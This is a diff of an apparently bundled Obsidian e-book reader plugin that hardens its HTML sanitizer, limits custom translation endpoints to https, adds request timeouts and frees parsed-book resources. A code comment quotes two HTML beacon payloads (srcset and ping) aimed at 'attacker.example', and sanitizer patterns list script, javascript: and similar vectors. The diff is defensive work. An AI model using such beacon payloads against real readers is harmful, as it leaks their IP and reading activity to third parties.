@@ -16130,7 +16130,7 @@ var FoliateBookReader = class {
       if (transformTarget) transformTarget.removeEventListener("data", onTransformData);
       throw error;
     }
-    const session = new FoliateSession(view, onTransformData, transformTarget);
+    const session = new FoliateSession(view, onTransformData, transformTarget, parsed);
     try {
       await session.applyAppearance(appearance);
     } catch (error) {
@@ -16161,12 +16161,16 @@ var FoliateBookReader = class {
   async extractCover(book, loader) {
     const { makeBook: makeBook2 } = await importFoliateModule();
     const parsed = await loadEpubFile(book, loader, makeBook2);
-    const bookObj = parsed;
-    if (typeof bookObj.getCover !== "function") return null;
-    const blob = await bookObj.getCover();
-    if (!blob) return null;
-    const coverBytes = await blob.arrayBuffer();
-    return { bytes: coverBytes, mimeType: sniffImageMime(coverBytes) ?? (blob.type || "image/jpeg") };
+    try {
+      const bookObj = parsed;
+      if (typeof bookObj.getCover !== "function") return null;
+      const blob = await bookObj.getCover();
+      if (!blob) return null;
+      const coverBytes = await blob.arrayBuffer();
+      return { bytes: coverBytes, mimeType: sniffImageMime(coverBytes) ?? (blob.type || "image/jpeg") };
+    } finally {
+      destroyParsedBook(parsed, "extractCover");
+    }
   }
   /**
    * Extract EPUB OPF metadata (title / creator / language). foliate-js parses
@@ -16182,39 +16186,57 @@ var FoliateBookReader = class {
     try {
       const { makeBook: makeBook2 } = await importFoliateModule();
       const parsed = await loadEpubFile(book, loader, makeBook2);
-      const bookObj = parsed;
-      const raw = bookObj.metadata ?? {};
-      const title = typeof raw.title === "string" && raw.title.trim() ? raw.title.trim() : void 0;
-      if (!title) return null;
-      const creator = raw.creator;
-      const authors = [];
-      if (typeof creator === "string" && creator.trim()) authors.push(creator.trim());
-      else if (Array.isArray(creator)) {
-        for (const c2 of creator) {
-          if (typeof c2 === "string" && c2.trim()) authors.push(c2.trim());
-        }
+      try {
+        return readParsedMetadata(parsed);
+      } finally {
+        destroyParsedBook(parsed, "readMetadata");
       }
-      const lang = raw.language;
-      const languages = [];
-      if (typeof lang === "string" && lang.trim()) languages.push(lang.trim());
-      else if (Array.isArray(lang)) {
-        for (const l3 of lang) {
-          if (typeof l3 === "string" && l3.trim()) languages.push(l3.trim());
-        }
-      }
-      return {
-        title,
-        authors,
-        languages,
-        publisher: typeof raw.publisher === "string" && raw.publisher.trim() ? raw.publisher.trim() : void 0,
-        identifier: typeof raw.identifier === "string" && raw.identifier.trim() ? raw.identifier.trim() : void 0,
-        description: typeof raw.description === "string" && raw.description.trim() ? raw.description.trim() : void 0,
-        cachedAt: Date.now()
-      };
     } catch (error) {
       console.warn("[ez-reader] foliate readMetadata failed", book.locator.path, error);
       return null;
     }
+  }
+};
+var readParsedMetadata = (parsed) => {
+  {
+    const bookObj = parsed;
+    const raw = bookObj.metadata ?? {};
+    const title = typeof raw.title === "string" && raw.title.trim() ? raw.title.trim() : void 0;
+    if (!title) return null;
+    const creator = raw.creator;
+    const authors = [];
+    if (typeof creator === "string" && creator.trim()) authors.push(creator.trim());
+    else if (Array.isArray(creator)) {
+      for (const c2 of creator) {
+        if (typeof c2 === "string" && c2.trim()) authors.push(c2.trim());
+      }
+    }
+    const lang = raw.language;
+    const languages = [];
+    if (typeof lang === "string" && lang.trim()) languages.push(lang.trim());
+    else if (Array.isArray(lang)) {
+      for (const l3 of lang) {
+        if (typeof l3 === "string" && l3.trim()) languages.push(l3.trim());
+      }
+    }
+    return {
+      title,
+      authors,
+      languages,
+      publisher: typeof raw.publisher === "string" && raw.publisher.trim() ? raw.publisher.trim() : void 0,
+      identifier: typeof raw.identifier === "string" && raw.identifier.trim() ? raw.identifier.trim() : void 0,
+      description: typeof raw.description === "string" && raw.description.trim() ? raw.description.trim() : void 0,
+      cachedAt: Date.now()
+    };
+  }
+};
+var destroyParsedBook = (parsed, context) => {
+  const book = parsed;
+  if (!book || typeof book.destroy !== "function") return;
+  try {
+    book.destroy();
+  } catch (error) {
+    console.warn(`[ez-reader] foliate book.destroy failed (${context})`, error);
   }
 };
 var importFoliateModule = async () => {
@@ -16230,6 +16252,8 @@ var loadEpubFile = async (book, loader, makeBook2) => {
 var FoliateSession = class {
   element;
   view;
+  /** Parsed foliate book — `destroy()` releases its blob URLs. See ctor. */
+  parsedBook;
   docListeners = /* @__PURE__ */ new Set();
   disposers = /* @__PURE__ */ new Set();
   transformCleanup;
@@ -16258,8 +16282,9 @@ var FoliateSession = class {
   findQuery = null;
   findMatches = [];
   findCursor = 0;
-  constructor(view, transformListener, transformTarget) {
+  constructor(view, transformListener, transformTarget, parsedBook) {
     this.view = view;
+    this.parsedBook = parsedBook;
     this.element = view;
     this.transformCleanup = () => {
       if (transformTarget) {
@@ -16294,6 +16319,15 @@ var FoliateSession = class {
     } catch (error) {
       console.warn("[ez-reader] foliate view.close failed", error);
     }
+    const book = this.parsedBook;
+    if (book && typeof book.destroy === "function") {
+      try {
+        book.destroy();
+      } catch (error) {
+        console.warn("[ez-reader] foliate book.destroy failed", error);
+      }
+    }
+    this.parsedBook = void 0;
     try {
       this.view.remove();
     } catch (error) {
@@ -16643,7 +16677,10 @@ var extractTextFromSection = (payload) => {
   const body = payload.body ?? payload.documentElement;
   return body?.textContent ?? "";
 };
-var sanitizeBookContent = (source) => source.replace(/<script\b[^>]*>[\s\S]*?<\/script\s*>/gi, "").replace(/<script\b[^>]*\/?>/gi, "").replace(/<(?:iframe|object|embed)\b[^>]*>[\s\S]*?<\/(?:iframe|object|embed)\s*>/gi, "").replace(/<(?:iframe|object|embed)\b[^>]*\/?>/gi, "").replace(/<meta\b[^>]*http-equiv\s*=\s*(?:"refresh"|'refresh'|refresh)[^>]*\/?>/gi, "").replace(/\son[a-z]+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)/gi, "").replace(/\s(?:src|poster|data)\s*=\s*(?:"(?:https?:|file:|javascript:)[^"]*"|'(?:https?:|file:|javascript:)[^']*'|(?:https?:|file:|javascript:)[^\s>]+)/gi, "");
+var sanitizeBookContent = (source) => source.replace(/<script\b[^>]*>[\s\S]*?<\/script\s*>/gi, "").replace(/<script\b[^>]*\/?>/gi, "").replace(/<(?:iframe|object|embed)\b[^>]*>[\s\S]*?<\/(?:iframe|object|embed)\s*>/gi, "").replace(/<(?:iframe|object|embed)\b[^>]*\/?>/gi, "").replace(/<meta\b[^>]*http-equiv\s*=\s*(?:"refresh"|'refresh'|refresh)[^>]*\/?>/gi, "").replace(/\son[a-z]+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)/gi, "").replace(
+  /\s(?:src|href|xlink:href|poster|data|formaction|action|background)\s*=\s*(?:"(?:https?:|file:|javascript:|vbscript:|data:text\/)[^"]*"|'(?:https?:|file:|javascript:|vbscript:|data:text\/)[^']*'|(?:https?:|file:|javascript:|vbscript:|data:text\/)[^\s>]+)/gi,
+  ""
+).replace(/\ssrcset\s*=\s*(?:"[^"]*(?:https?:|file:|javascript:)[^"]*"|'[^']*(?:https?:|file:|javascript:)[^']*'|[^\s>]*(?:https?:|file:|javascript:)[^\s>]*)/gi, "").replace(/\sping\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)/gi, "");
 
 // src/adapters/text/PagedTextSession.ts
 var getAppearanceCssProps = (appearance) => {
@@ -17267,18 +17304,36 @@ var TxtBookReader = class {
 };
 var decodeText = (bytes) => {
   const view = new Uint8Array(bytes);
+  if (view.length >= 2 && view[0] === 255 && view[1] === 254) {
+    return decodeUtf16(view.subarray(2), "utf-16le");
+  }
+  if (view.length >= 2 && view[0] === 254 && view[1] === 255) {
+    return decodeUtf16(view.subarray(2), "utf-16be");
+  }
   if (view.length >= 3 && view[0] === 239 && view[1] === 187 && view[2] === 191) {
+    const strict = tryDecode(view.subarray(3), "utf-8", true);
+    if (strict !== null) return strict;
+    const gb2 = tryDecode(view.subarray(3), "gb18030", false);
+    if (gb2 !== null) return gb2;
     return new TextDecoder("utf-8").decode(view.subarray(3));
   }
+  const utf8 = tryDecode(view, "utf-8", true);
+  if (utf8 !== null) return utf8;
+  const gb = tryDecode(view, "gb18030", false);
+  if (gb !== null) return gb;
+  return new TextDecoder("utf-8").decode(view);
+};
+var tryDecode = (bytes, label, fatal) => {
   try {
-    return new TextDecoder("utf-8", { fatal: true }).decode(view);
+    return new TextDecoder(label, { fatal }).decode(bytes);
   } catch {
-    try {
-      return new TextDecoder("gb18030").decode(view);
-    } catch {
-      return new TextDecoder("utf-8").decode(view);
-    }
+    return null;
   }
+};
+var decodeUtf16 = (bytes, label) => {
+  const decoded = tryDecode(bytes, label, false);
+  if (decoded !== null) return decoded;
+  return new TextDecoder("utf-8").decode(bytes);
 };
 
 // src/core/utils/sanitizeHtml.ts
@@ -17302,14 +17357,44 @@ var DANGEROUS_TAGS = /* @__PURE__ */ new Set([
   "frame",
   "frameset"
 ]);
-var URL_ATTRS = /* @__PURE__ */ new Set(["href", "src", "xlink:href", "formaction", "action"]);
+var URL_ATTRS = /* @__PURE__ */ new Set([
+  "href",
+  "src",
+  "xlink:href",
+  "formaction",
+  "action",
+  // P0 fix: these fetch without a click and were missing from the set, so
+  // they bypassed `isDangerousUrl` entirely. Verified before the fix:
+  //   sanitizeHtml('<img srcset="https://attacker.example/b?1 1x">')
+  //   sanitizeHtml('<a href="#x" ping="https://attacker.example/t">')
+  // both passed through verbatim. A MOBI from an unvetted Calibre mirror
+  // could therefore beacon the user's IP + read time to a third party
+  // every time a chapter rendered — contradicting PRIVACY.md's "EzReader
+  // never transmits" claim.
+  "srcset",
+  "imagesrcset",
+  "ping",
+  // `<body background="...">` is legacy but still a real fetch.
+  "background",
+  "poster",
+  "data"
+]);
 var isDangerousUrl = (raw) => {
   const normalized = raw.replace(/[\u0000-\u001F\u007F]+/g, "").trim().toLowerCase();
-  if (normalized.startsWith("javascript:")) return true;
-  if (normalized.startsWith("data:text/html")) return true;
-  if (normalized.startsWith("vbscript:")) return true;
-  return false;
+  if (normalized.length === 0) return false;
+  if (normalized.startsWith("data:")) {
+    return !normalized.startsWith("data:image/") || normalized.startsWith("data:image/svg+xml");
+  }
+  if (normalized.startsWith("#")) return false;
+  if (normalized.startsWith("/") || normalized.startsWith("./") || normalized.startsWith("../") || normalized.startsWith("blob:")) {
+    return false;
+  }
+  return /^[a-z][a-z0-9+.-]*:/.test(normalized);
 };
+var isDangerousSrcset = (raw) => raw.split(",").some((candidate) => {
+  const url = candidate.trim().split(/\s+/)[0] ?? "";
+  return url.length > 0 && isDangerousUrl(url);
+});
 var segmentize = (input) => {
   const out = [];
   let i3 = 0;
@@ -17374,8 +17459,11 @@ var sanitizeAttrs = (rawAttrs) => {
     if (name.startsWith("on")) {
       continue;
     }
-    if (URL_ATTRS.has(name) && isDangerousUrl(value)) {
-      continue;
+    if (URL_ATTRS.has(name)) {
+      const dangerous = name === "srcset" || name === "imagesrcset" ? isDangerousSrcset(value) : isDangerousUrl(value);
+      if (dangerous) {
+        continue;
+      }
     }
     const safeValue = value.replace(/&/g, "&amp;").replace(/"/g, "&quot;");
     if (name === "href" && !value.startsWith("#") && !isDangerousUrl(value)) {
@@ -17691,7 +17779,29 @@ var PdfCoverExtractor = class {
 
 // src/adapters/translation/BaseTranslationProvider.ts
 var import_obsidian4 = require("obsidian");
+var withDeadline = (promise, ms, label) => new Promise((resolve, reject) => {
+  const timer = setTimeout(
+    () => reject(new Error(`\u7FFB\u8BD1\u8BF7\u6C42\u8D85\u65F6 (${Math.round(ms / 1e3)}s): ${label} \u65E0\u54CD\u5E94,\u8BF7\u68C0\u67E5\u7F51\u7EDC\u6216 API \u5730\u5740`)),
+    ms
+  );
+  promise.then(
+    (value) => {
+      clearTimeout(timer);
+      resolve(value);
+    },
+    (error) => {
+      clearTimeout(timer);
+      reject(error);
+    }
+  );
+});
+var TRANSLATION_TIMEOUT_MS = 2e4;
 var BaseTranslationProvider = class {
+  /**
+   * Per-provider request deadline. Overridable so tests can exercise the
+   * timeout path without actually waiting the production 20s.
+   */
+  requestTimeoutMs = TRANSLATION_TIMEOUT_MS;
   /** Stringify an unknown thrown value for error messages. */
   formatError(error) {
     return error instanceof Error ? error.message : String(error);
@@ -17713,13 +17823,13 @@ var BaseTranslationProvider = class {
     const name = options?.providerName ?? this.providerName;
     let response;
     try {
-      response = await (0, import_obsidian4.requestUrl)({
+      response = await withDeadline((0, import_obsidian4.requestUrl)({
         url,
         method: typeof init.method === "string" ? init.method : "GET",
         headers: this.stringifyHeaders(init.headers),
         body: typeof init.body === "string" ? init.body : void 0,
         throw: false
-      });
+      }), this.requestTimeoutMs, name);
     } catch (error) {
       throw new Error(`\u7F51\u7EDC\u8BF7\u6C42\u5931\u8D25: ${this.formatError(error)}`);
     }
@@ -18554,10 +18664,22 @@ var OpenAICompatibleTranslationProvider = class extends BaseTranslationProvider 
       return null;
     }
   }
+  /**
+   * P1 security fix: `http:` used to be accepted here, which sends the
+   * user's API key and the selected book text in cleartext. That matters
+   * for these two providers specifically — their config is a *custom*
+   * base URL, commonly copy-pasted from a forum post or pointing at a
+   * self-hosted Ollama / LM Studio on the LAN, and the key is a real
+   * bearer credential. A typo or a hostile config string would leak it to
+   * anyone on the path.
+   *
+   * `https:` only. Users who genuinely need a plaintext LAN endpoint can
+   * put it behind a TLS terminator or a VPN.
+   */
   isValidHttpUrl(s3) {
     try {
       const url = new URL(s3);
-      return url.protocol === "https:" || url.protocol === "http:";
+      return url.protocol === "https:";
     } catch {
       return false;
     }
@@ -18710,10 +18832,22 @@ var AnthropicCompatibleTranslationProvider = class extends BaseTranslationProvid
       return null;
     }
   }
+  /**
+   * P1 security fix: `http:` used to be accepted here, which sends the
+   * user's API key and the selected book text in cleartext. That matters
+   * for these two providers specifically — their config is a *custom*
+   * base URL, commonly copy-pasted from a forum post or pointing at a
+   * self-hosted Ollama / LM Studio on the LAN, and the key is a real
+   * bearer credential. A typo or a hostile config string would leak it to
+   * anyone on the path.
+   *
+   * `https:` only. Users who genuinely need a plaintext LAN endpoint can
+   * put it behind a TLS terminator or a VPN.
+   */
   isValidHttpUrl(s3) {
     try {
       const url = new URL(s3);
-      return url.protocol === "https:" || url.protocol === "http:";
+      return url.protocol === "https:";
     } catch {
       return false;
     }
@@ -23558,6 +23692,7 @@ var TranslationDrawer = class {
     this.root.addClass("is-hidden");
     this.abortController?.abort();
     this.abortController = null;
+    this.translateGeneration += 1;
   }
   toggle() {
     this.root.toggleClass("is-hidden", !this.root.hasClass("is-hidden"));
@@ -24184,6 +24319,11 @@ var ReaderView = class _ReaderView extends import_obsidian17.ItemView {
   // P0-7 修复: setEntry 是 sync, 旧 session.close() 不能 fire-and-forget
   // (见 setEntry 注释). 这里存 promise 让后续 openSession / onClose await.
   pendingClosePromise;
+  /**
+   * P1: in-flight `openSession`, so overlapping calls serialise instead of
+   * both mounting a reader onto the host. See `openSession`.
+   */
+  openingPromise;
   // C7 修复: setEntry / openSession 生成一个 token. whenReady / openExcerptById
   // await 完后, 还要检查 token 是不是还是当前 — 否则 await 的是旧 session,
   // 新 session 已经挂上去, 旧 awaiter 在新 session 上调 jumpToExcerpt 跳到
@@ -24654,6 +24794,20 @@ var ReaderView = class _ReaderView extends import_obsidian17.ItemView {
     }
   }
   async openSession() {
+    if (!this.entry || !this.host) return;
+    if (this.openingPromise) {
+      await this.openingPromise;
+      if (this.session || !this.entry || !this.host) return;
+    }
+    const run = this.openSessionInner();
+    this.openingPromise = run;
+    try {
+      await run;
+    } finally {
+      if (this.openingPromise === run) this.openingPromise = void 0;
+    }
+  }
+  async openSessionInner() {
     if (!this.entry || !this.host) return;
     if (this.pendingClosePromise) {
       await this.pendingClosePromise;
